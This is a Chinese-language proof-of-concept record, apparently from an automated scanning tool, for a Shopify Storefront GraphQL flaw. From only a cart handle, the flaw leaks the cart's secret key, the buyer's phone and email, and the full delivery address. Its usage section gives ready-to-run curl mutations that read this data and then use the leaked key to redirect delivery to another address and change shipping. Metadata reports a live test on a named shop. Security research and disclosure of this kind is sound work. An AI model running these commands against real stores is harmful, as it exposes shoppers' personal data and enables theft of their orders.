# Shopify Storefront cartPrepareForCompletion 裸 handle 泄露完整收货地址+买家电话，并用泄露 key 改写收货地址/配送选项（cart 接管升级）

- **code**: shopify-storefront-cartprepareforcompletion-delivery-pii-and
- **kind**: poc
- **category**: unauthorized
- **component**: Shopify Storefront GraphQL（cartPrepareForCompletion / cartDeliveryAddressesUpdate / cartSelectedDeliveryOptionsUpdate / cartSubmitForCompletion）
- **severity**: high
- **language**: bash
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-11 UTC retro-refresh.com /api/graphql 匿名无 Cookie 实测：裸 handle cartPrepareForCompletion → 200 CartStatusReady，cart.id 回显真实 ?key=75c3fab9827317941835d86a95526b03、buyerIdentity.email/phone=victim3-i1587@example.com/+447911123456、delivery.addresses 全量 PII（Alice Victim/12 Rose Lane/Flat 3/London/ENG/SW1A 1AA/GB/+447911123456）；错 key 回显逐字相同、随机 handle → result:null。用泄露 key cartDeliveryAddressesUpdate → userErrors=[] 地址改写为 Verifier/PWN-i1587/666 Redirect Lane/Manchester/M1 1AA；cartSelectedDeliveryOptionsUpdate → userErrors=[] 配送 48→24。无地址 cart 裸 handle prepare → errors=[DELIVERY_ADDRESS_REQUIRED,PENDING_PROCESS]，泄露 key cartDeliveryAddressesAdd 后 → CartStatusReady；裸 handle cartSubmitForCompletion → SubmitFailed errors=[PAYMENTS_METHOD_REQUIRED] + checkoutUrl。已报 finding 129（task#9/intent#1587）。
- **path**: pocs/shopify-storefront-cartprepareforcompletion-delivery-pii-and/poc.sh
- **tags**: shopify,storefront,graphql,cart,idor,unauthorized,pii,delivery-address,prepare-for-completion
- **created_at**: 2026-11-11T17:21:31.392Z
- **engine**: https://retro-refresh.com
- **found_by**: vuln-scan

## 描述

Shopify Storefront 的 cartPrepareForCompletion 不校验 cart id 中的 ?key，并把 Cart 对象整体回显：除真实 key 与 buyerIdentity.email 外，还包含 buyerIdentity.phone 与 delivery.addresses 全量收货 PII（姓名/公司/街道1/街道2/城市/省/邮编/国家/电话/可选项 id/selected）。拿到 25 位 handle 的匿名者因此可读完整收货信息并用泄漏 key 写 cartDeliveryAddressesUpdate（收货改道）、cartSelectedDeliveryOptionsUpdate（换配送），把目标购物车从 DELIVERY_ADDRESS_REQUIRED/PENDING_PROCESS 推进到 CartStatusReady；cartSubmitForCompletion 同样忽略 key，最终仅卡在 PAYMENTS_METHOD_REQUIRED。前提：handle 需已泄漏（不可枚举）；buyerIdentity.phone / 地址 phone 受 libphonenumber 校验，+447700900xxx（drama 段）会被判 invalid，用真实号段（如 +447911123456）可写。

## 用法

```
前置：Shopify 托管店 Storefront API 匿名可达；已知目标 cart 25 位 handle。

# 0) （受害者侧基线）cartCreate 时写入 email/phone/收货地址，拿 handle
# 1) 匿名无 Cookie 仅凭 handle，一次拿 key + email + phone + 全量收货地址
curl -sk -X POST 'https://<shop>/api/graphql' -H 'Content-Type: application/json' --data '{"query":"mutation P($cartId:ID!){cartPrepareForCompletion(cartId:$cartId){result{__typename ... on CartStatusNotReady{cart{id buyerIdentity{email phone countryCode} delivery{addresses{id selected address{__typename ... on CartDeliveryAddress{firstName lastName address1 address2 city company provinceCode zip countryCode phone}}}} deliveryGroups(first:10){nodes{id deliveryOptions{handle title} selectedDeliveryOption{handle title}}}} errors{code}} ... on CartStatusReady{cart{id buyerIdentity{email phone countryCode} delivery{addresses{id selected address{__typename ... on CartDeliveryAddress{firstName lastName address1 address2 city company provinceCode zip countryCode phone}}}}}} userErrors{code}}}","variables":{"cartId":"gid://shopify/Cart/<handle>"}}'

# 2) 收货改道（用 leaked key）
curl -sk -X POST 'https://<shop>/api/graphql' -H 'Content-Type: application/json' --data '{"query":"mutation U($cartId:ID!,$addresses:[CartSelectableAddressUpdateInput!]!){cartDeliveryAddressesUpdate(cartId:$cartId,addresses:$addresses){cart{delivery{addresses{id selected address{__typename ... on CartDeliveryAddress{firstName lastName address1 city zip phone}}}}} userErrors{field message code}}}","variables":{"cartId":"gid://shopify/Cart/<handle>?key=<REAL_KEY>","addresses":[{"id":"<CartSelectableAddress id from step 1>","address":{"deliveryAddress":{"firstName":"Verifier","lastName":"PWN","address1":"666 Redirect Lane","city":"Manchester","countryCode":"GB","zip":"M1 1AA","phone":"+447911123456"}},"selected":true}]}}'

# 3) 换配送选项
#    deliveryGroupId 用 step1 的 gid://shopify/CartDeliveryGroup/...?cart=<handle>
#    deliveryOptionHandle 用 step1 的 nodes.deliveryOptions[].handle

# 4) 推进状态 + 提交（裸 handle，不带 key）
#    cartPrepareForCompletion 应从 DELIVERY_ADDRESS_REQUIRED,PENDING_PROCESS → CartStatusReady
#    cartSubmitForCompletion(cartId:"gid://shopify/Cart/<handle>", attemptToken:"任意 UUID") → SubmitFailed errors=[PAYMENTS_METHOD_REQUIRED] + checkoutUrl

# 5) GET /cart/c/<handle>（无 key）→ 302 shop.app 结账 + shop_pay_token JWT（claims 仅 iss/session_token/landing_page，无 PII）

判据：step1 回显真实 ?key + buyerIdentity.phone + delivery.addresses 全量字段；step2/3 userErrors=[]；step4 状态变为 CartStatusReady 且 submit 只剩 PAYMENTS_METHOD_REQUIRED。
```

## 正文

```
# PoC：Shopify Storefront cartPrepareForCompletion → 收货 PII 泄露 + 地址改道

## 结论
- `POST /api/graphql` 的 `cartPrepareForCompletion(cartId:"gid://shopify/Cart/<handle>")` **不校验 ?key**。
- 返回的 `Cart` 对象包含：真实 `?key`、`buyerIdentity.email`、`buyerIdentity.phone`、`delivery.addresses{ id selected address{ firstName lastName address1 address2 city company provinceCode zip countryCode phone } }`、`deliveryGroups{nodes{id deliveryOptions{handle title} selectedDeliveryOption{handle title}}}`。
- 三态对照：正确 key / 去掉 key / 任意错误 key 回显逐字相同；随机 handle → `result:null`。
- 用泄漏 key 可 `cartDeliveryAddressesUpdate` 改写收货地址、`cartSelectedDeliveryOptionsUpdate` 切换配送，并把购物车从 `DELIVERY_ADDRESS_REQUIRED,PENDING_PROCESS` 推到 `CartStatusReady`；`cartSubmitForCompletion` 同样忽略 key，最终只剩 `PAYMENTS_METHOD_REQUIRED`。
- `GET /cart/c/<handle>`（无 key）→ 302 到 shop.app 结账并下发 `shop_pay_token`（claims 只有 iss/session_token/landing_page/exp，无 PII）。

## 注意
- handle 为 108bit 随机，不可枚举；需要先通过共享 permalink、Referer、页面 JS `ShopifyAnalytics.meta.cart.id` 等渠道获得。
- phone 受 libphonenumber 校验：+447700900xxx 一类戏剧号段会被判 invalid；用真实号段（如 +447911123456）可写。
- 结账侧：地址改道停留在 cart 层；retro-refresh.com 侧 checkout 页/UCP get_checkout 不序列化收货地址（checkout SPA 数据来自 Shopify 托管域）。

## 复核证据
2026-11-11 UTC，retro-refresh.com：finding 129 / intent 1587，原始响应落盘 /opt/artex/data/tasks/9/i1587/。
```
